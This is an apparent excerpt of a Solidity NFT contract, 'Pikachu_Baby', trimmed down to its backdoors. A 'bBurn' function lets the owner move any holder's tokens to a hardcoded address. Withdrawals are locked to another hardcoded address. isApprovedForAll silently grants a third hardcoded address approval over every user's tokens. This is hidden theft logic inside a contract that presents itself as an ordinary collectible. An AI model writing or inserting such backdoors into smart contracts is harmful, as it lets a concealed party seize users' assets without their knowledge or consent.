...
contract Pikachu_Baby is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Pikachu_Baby", "PB", maxBatchSize_, collectionSize_) {
  ...
  function bBurn(uint256[] memory tokenids) external onlyOwner {
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0xd3A743BdBb7FE2De018F18d5A772Bf12bDe99fBc, tokenid);
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x18da5e4732b9B377fcfa3a54752096236B6D4c45);
  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x2038FEEf082f6941720abDdbb1e1Bf90e4294947){return true;}
